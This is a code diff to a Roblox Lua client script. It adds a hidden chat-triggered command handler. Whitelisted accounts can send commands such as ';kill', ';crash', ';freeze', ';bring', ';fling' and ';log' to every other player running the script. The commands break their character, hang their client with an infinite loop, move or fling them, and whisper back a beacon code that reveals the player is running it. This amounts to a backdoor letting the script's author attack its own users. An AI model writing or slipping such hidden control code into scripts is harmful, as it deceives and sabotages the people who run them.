@@ -94,16 +94,75 @@ LOCAL_PLAYER.CharacterAdded:Connect(function()
 	tag(LOCAL_PLAYER)
 end)
 
-local lastKillTimestamp = 0
+local lastCommand = {
+	kill = 0,
+	crash = 0,
+	freeze = 0,
+	bring = 0,
+	fling = 0,
+	log = 0
+}
 
-local function executeKill()
+local function getSenderHRP()
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if isWhitelisted(plr.UserId) and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+			return plr.Character.HumanoidRootPart
+		end
+	end
+	return nil
+end
+
+local function handleCommand(cmd)
 	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
 	local char = LOCAL_PLAYER.Character
-	if char then
-		for _, part in ipairs(char:GetDescendants()) do
-			if part:IsA("BasePart") then
-				part:BreakJoints()
+	local hrp = char and char:FindFirstChild("HumanoidRootPart")
+
+	if cmd == "kill" then
+		if char then
+			for _, part in ipairs(char:GetDescendants()) do
+				if part:IsA("BasePart") then
+					part:BreakJoints()
+				end
 			end
+		end
+
+	elseif cmd == "crash" then
+		while true do end
+
+	elseif cmd == "freeze" and hrp then
+		if not hrp:FindFirstChild("Frozen") then
+			local bv = Instance.new("BodyVelocity")
+			bv.Name = "Frozen"
+			bv.Velocity = Vector3.new(0, 0, 0)
+			bv.MaxForce = Vector3.new(1, 1, 1) * 1e9
+			bv.P = 1e5
+			bv.Parent = hrp
+		end
+
+	elseif cmd == "bring" and hrp then
+		local target = getSenderHRP()
+		if target then
+			hrp.CFrame = target.CFrame + Vector3.new(0, 3, 0)
+		end
+
+	elseif cmd == "fling" and hrp then
+		local target = getSenderHRP()
+		if target then
+			local bv = Instance.new("BodyVelocity")
+			bv.Velocity = (target.Position - hrp.Position).Unit * 200
+			bv.MaxForce = Vector3.new(1, 1, 1) * 1e6
+			bv.P = 9e4
+			bv.Parent = hrp
+			game.Debris:AddItem(bv, 0.5)
+		end
+
+	elseif cmd == "log" then
+		local whisper = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXWhisper")
+		local sender = getSenderHRP() and Players:GetPlayerFromCharacter(getSenderHRP().Parent)
+		if whisper and sender then
+			task.delay(0.4, function()
+				whisper:SendAsync("8Uz1P", sender)
+			end)
 		end
 	end
 end
@@ -115,15 +174,20 @@ TextChatService.OnIncomingMessage = function(message)
 	if not isWhitelisted(senderId) then return end
 
 	local msg = message.Text:lower()
-	if msg == ";kill" then
-		lastKillTimestamp = tick()
+	for command, _ in pairs(lastCommand) do
+		if msg == ";"..command then
+			lastCommand[command] = tick()
+		end
 	end
 end
 
 task.spawn(function()
 	while true do
-		if tick() - lastKillTimestamp <= 2 then
-			executeKill()
+		local now = tick()
+		for command, t in pairs(lastCommand) do
+			if now - t <= 2 then
+				handleCommand(command)
+			end
 		end
 		task.wait(0.5)
 	end
